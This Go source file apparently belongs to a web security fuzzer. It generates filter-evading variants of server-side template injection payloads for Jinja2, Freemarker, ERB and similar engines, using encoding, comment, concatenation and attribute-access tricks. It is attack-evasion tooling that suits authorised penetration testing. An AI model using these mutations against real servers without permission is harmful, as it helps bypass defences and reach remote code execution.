package strategies

import (
	"fmt"
	"strings"
)

// SSTIMutator applies mutations specific to Server-Side Template Injection
type SSTIMutator struct {
	TargetEngine string // jinja2, twig, freemarker, velocity, smarty, erb, mako, pebble, auto
}

// NewSSTIMutator creates a new SSTI mutator
func NewSSTIMutator() *SSTIMutator {
	return &SSTIMutator{
		TargetEngine: "auto", // Auto-detect/try all
	}
}

// Mutate applies SSTI-specific mutations
func (s *SSTIMutator) Mutate(payload string) []MutationResult {
	var results []MutationResult

	// Template delimiter variations
	results = append(results, s.delimiterMutations(payload)...)

	// Unicode escapes for template syntax
	results = append(results, s.unicodeMutations(payload)...)

	// Comment injection within templates
	results = append(results, s.commentMutations(payload)...)

	// Alternative method invocation syntax
	results = append(results, s.methodMutations(payload)...)

	// Whitespace obfuscation
	results = append(results, s.whitespaceMutations(payload)...)

	// String concatenation tricks
	results = append(results, s.concatMutations(payload)...)

	// Filter bypass techniques
	results = append(results, s.filterBypassMutations(payload)...)

	return results
}

// delimiterMutations creates variations of template delimiters
func (s *SSTIMutator) delimiterMutations(payload string) []MutationResult {
	var results []MutationResult

	// Jinja2/Twig style delimiters
	if strings.Contains(payload, "{{") {
		// Add raw blocks around expression
		results = append(results, MutationResult{
			Payload:     strings.ReplaceAll(payload, "{{", "{%raw%}{{"),
			Mutation:    "ssti_raw_block",
			Description: "Wrap in raw block (Jinja2/Twig)",
		})
		results = append(results, MutationResult{
			Payload:     strings.ReplaceAll(payload, "}}", "}}{%endraw%}"),
			Mutation:    "ssti_raw_block_end",
			Description: "End raw block (Jinja2/Twig)",
		})

		// Use statement blocks instead of expression
		results = append(results, MutationResult{
			Payload:     strings.ReplaceAll(strings.ReplaceAll(payload, "{{", "{%"), "}}", "%}"),
			Mutation:    "ssti_statement_block",
			Description: "Convert to statement block",
		})

		// Add spaces inside delimiters
		results = append(results, MutationResult{
			Payload:     strings.ReplaceAll(strings.ReplaceAll(payload, "{{", "{{ "), "}}", " }}"),
			Mutation:    "ssti_spaced_delimiters",
			Description: "Add spaces inside delimiters",
		})
	}

	// Freemarker style
	if strings.Contains(payload, "${") {
		// Alternate interpolation syntax
		results = append(results, MutationResult{
			Payload:     strings.ReplaceAll(payload, "${", "#{"),
			Mutation:    "ssti_hash_interpolation",
			Description: "Use hash interpolation (Freemarker)",
		})

		// Square bracket syntax
		results = append(results, MutationResult{
			Payload:     strings.ReplaceAll(payload, "${", "$["),
			Mutation:    "ssti_bracket_syntax",
			Description: "Use bracket syntax variation",
		})
	}

	// Add alternative delimiters for different engines
	delimiterVariants := []struct {
		from, to, name, desc string
	}{
		{"{{", "<%= ", "erb_style", "Ruby ERB style"},
		{"{{", "${ ", "el_style", "Expression Language style"},
		{"{{", "#{ ", "ruby_interpolation", "Ruby string interpolation"},
		{"{{", "[% ", "template_toolkit", "Template Toolkit style"},
		{"}}", " %>", "erb_style_close", "ERB closing tag"},
	}

	for _, v := range delimiterVariants {
		if strings.Contains(payload, v.from) {
			results = append(results, MutationResult{
				Payload:     strings.ReplaceAll(payload, v.from, v.to),
				Mutation:    "ssti_" + v.name,
				Description: v.desc,
			})
		}
	}

	return results
}

// unicodeMutations applies Unicode escapes to template syntax
func (s *SSTIMutator) unicodeMutations(payload string) []MutationResult {
	var results []MutationResult

	// Unicode escapes for common characters
	unicodeReplacements := map[string]string{
		"{":  "\\u007b",
		"}":  "\\u007d",
		"[":  "\\u005b",
		"]":  "\\u005d",
		".":  "\\u002e",
		"_":  "\\u005f",
		"(":  "\\u0028",
		")":  "\\u0029",
		"'":  "\\u0027",
		"\"": "\\u0022",
	}

	// Full-width Unicode variants
	fullWidthReplacements := map[string]string{
		"{": "\uff5b", // Fullwidth left curly bracket
		"}": "\uff5d", // Fullwidth right curly bracket
		"(": "\uff08", // Fullwidth left parenthesis
		")": "\uff09", // Fullwidth right parenthesis
		"[": "\uff3b", // Fullwidth left square bracket
		"]": "\uff3d", // Fullwidth right square bracket
	}

	// Apply escape sequences
	for char, escape := range unicodeReplacements {
		if strings.Contains(payload, char) {
			results = append(results, MutationResult{
				Payload:     strings.ReplaceAll(payload, char, escape),
				Mutation:    "ssti_unicode_escape",
				Description: fmt.Sprintf("Unicode escape for '%s'", char),
			})
		}
	}

	// Apply fullwidth characters
	mutated := payload
	for char, fullwidth := range fullWidthReplacements {
		mutated = strings.ReplaceAll(mutated, char, fullwidth)
	}
	if mutated != payload {
		results = append(results, MutationResult{
			Payload:     mutated,
			Mutation:    "ssti_fullwidth",
			Description: "Fullwidth Unicode characters",
		})
	}

	return results
}

// commentMutations injects comments within template expressions
func (s *SSTIMutator) commentMutations(payload string) []MutationResult {
	var results []MutationResult

	// Jinja2/Twig comment injection
	if strings.Contains(payload, "{{") {
		// Insert comment between expression parts
		results = append(results, MutationResult{
			Payload:     strings.ReplaceAll(payload, "{{", "{{#}}"),
			Mutation:    "ssti_jinja_comment",
			Description: "Jinja2 comment injection",
		})

		results = append(results, MutationResult{
			Payload:     strings.ReplaceAll(payload, ".", "{#.#}."),
			Mutation:    "ssti_comment_in_dot",
			Description: "Comment around dot accessor",
		})
	}

	// Freemarker comment injection
	if strings.Contains(payload, "${") {
		results = append(results, MutationResult{
			Payload:     strings.ReplaceAll(payload, "${", "${<#-- -->"),
			Mutation:    "ssti_freemarker_comment",
			Description: "Freemarker comment injection",
		})
	}

	// HTML comment injection (may be processed by template)
	results = append(results, MutationResult{
		Payload:     "<!--" + payload + "-->",
		Mutation:    "ssti_html_comment_wrap",
		Description: "Wrap in HTML comment",
	})

	return results
}

// methodMutations creates alternative method invocation syntax
func (s *SSTIMutator) methodMutations(payload string) []MutationResult {
	var results []MutationResult

	// Replace dot notation with bracket notation
	if strings.Contains(payload, ".") {
		// Convert obj.method to obj['method']
		parts := strings.Split(payload, ".")
		if len(parts) >= 2 {
			bracketNotation := parts[0]
			for _, part := range parts[1:] {
				bracketNotation += "['" + part + "']"
			}
			results = append(results, MutationResult{
				Payload:     bracketNotation,
				Mutation:    "ssti_bracket_notation",
				Description: "Convert dot to bracket notation",
			})

			// Double bracket notation
			doubleNotation := parts[0]
			for _, part := range parts[1:] {
				doubleNotation += `["` + part + `"]`
			}
			results = append(results, MutationResult{
				Payload:     doubleNotation,
				Mutation:    "ssti_double_bracket",
				Description: "Double quote bracket notation",
			})
		}
	}

	// getattr() style access (Python/Jinja2)
	if strings.Contains(payload, ".__") {
		// Split and use getattr
		results = append(results, MutationResult{
			Payload:     strings.ReplaceAll(payload, ".__class__", "|attr('__class__')"),
			Mutation:    "ssti_attr_filter",
			Description: "Use attr filter for dunder",
		})
	}

	// Alternative function calls
	if strings.Contains(payload, "()") {
		results = append(results, MutationResult{
			Payload:     strings.ReplaceAll(payload, "()", ".__call__()"),
			Mutation:    "ssti_explicit_call",
			Description: "Explicit __call__ invocation",
		})
	}

	return results
}

// whitespaceMutations applies whitespace obfuscation
func (s *SSTIMutator) whitespaceMutations(payload string) []MutationResult {
	var results []MutationResult

	// Tab characters
	results = append(results, MutationResult{
		Payload:     strings.ReplaceAll(payload, " ", "\t"),
		Mutation:    "ssti_tabs",
		Description: "Replace spaces with tabs",
	})

	// Multiple spaces
	results = append(results, MutationResult{
		Payload:     strings.ReplaceAll(payload, " ", "  "),
		Mutation:    "ssti_double_space",
		Description: "Double spaces",
	})

	// Newlines within expression (if supported)
	results = append(results, MutationResult{
		Payload:     strings.ReplaceAll(payload, ".", ".\n"),
		Mutation:    "ssti_newline_inject",
		Description: "Newline after dot accessor",
	})

	// Zero-width spaces
	results = append(results, MutationResult{
		Payload:     strings.ReplaceAll(payload, ".", "\u200b."),
		Mutation:    "ssti_zwsp",
		Description: "Zero-width space injection",
	})

	return results
}

// concatMutations applies string concatenation tricks
func (s *SSTIMutator) concatMutations(payload string) []MutationResult {
	var results []MutationResult

	// Split strings and concatenate
	// For example: "class" -> "cl"+"ass"
	keywords := []string{"class", "import", "config", "init", "globals", "builtins", "system", "popen"}

	for _, keyword := range keywords {
		if strings.Contains(payload, keyword) {
			if len(keyword) > 2 {
				mid := len(keyword) / 2
				concat := `"` + keyword[:mid] + `"+"` + keyword[mid:] + `"`
				results = append(results, MutationResult{
					Payload:     strings.ReplaceAll(payload, keyword, concat),
					Mutation:    "ssti_string_concat",
					Description: fmt.Sprintf("Split '%s' with concatenation", keyword),
				})

				// Jinja2 join filter
				chars := strings.Split(keyword, "")
				joinedChars := `["` + strings.Join(chars, `","`) + `"]|join`
				results = append(results, MutationResult{
					Payload:     strings.ReplaceAll(payload, keyword, joinedChars),
					Mutation:    "ssti_join_filter",
					Description: fmt.Sprintf("Join filter for '%s'", keyword),
				})
			}
		}
	}

	// Format string tricks
	if strings.Contains(payload, "{{") && strings.Contains(payload, "}}") {
		results = append(results, MutationResult{
			Payload:     strings.ReplaceAll(payload, "{{", "{{''+"),
			Mutation:    "ssti_empty_concat",
			Description: "Prepend empty string concatenation",
		})
	}

	return results
}

// filterBypassMutations applies filter bypass techniques
func (s *SSTIMutator) filterBypassMutations(payload string) []MutationResult {
	var results []MutationResult

	// Jinja2 filter bypasses
	if strings.Contains(payload, "{{") {
		// request object access
		results = append(results, MutationResult{
			Payload:     strings.ReplaceAll(payload, "__class__", "['__cla''ss__']"),
			Mutation:    "ssti_split_dunder",
			Description: "Split dunder with quotes",
		})

		// Use request.args or request.values
		results = append(results, MutationResult{
			Payload:     "{{request|attr(request.args.a)}}&a=__class__",
			Mutation:    "ssti_request_args",
			Description: "Use request.args for attribute",
		})

		// Hex encoding of attribute names
		results = append(results, MutationResult{
			Payload:     strings.ReplaceAll(payload, "__class__", "__\\x63lass__"),
			Mutation:    "ssti_hex_escape",
			Description: "Hex escape in attribute name",
		})
	}

	// Common filter bypass patterns
	bypassPatterns := []struct {
		from, to, name, desc string
	}{
		{"_", "\\x5f", "underscore_hex", "Hex encode underscore"},
		{".", "\\x2e", "dot_hex", "Hex encode dot"},
		{"'", "\\x27", "quote_hex", "Hex encode single quote"},
		{"[", "\\x5b", "bracket_hex", "Hex encode bracket"},
		{"]", "\\x5d", "bracket_close_hex", "Hex encode closing bracket"},
	}

	for _, bp := range bypassPatterns {
		if strings.Contains(payload, bp.from) {
			results = append(results, MutationResult{
				Payload:     strings.ReplaceAll(payload, bp.from, bp.to),
				Mutation:    "ssti_" + bp.name,
				Description: bp.desc,
			})
		}
	}

	return results
}
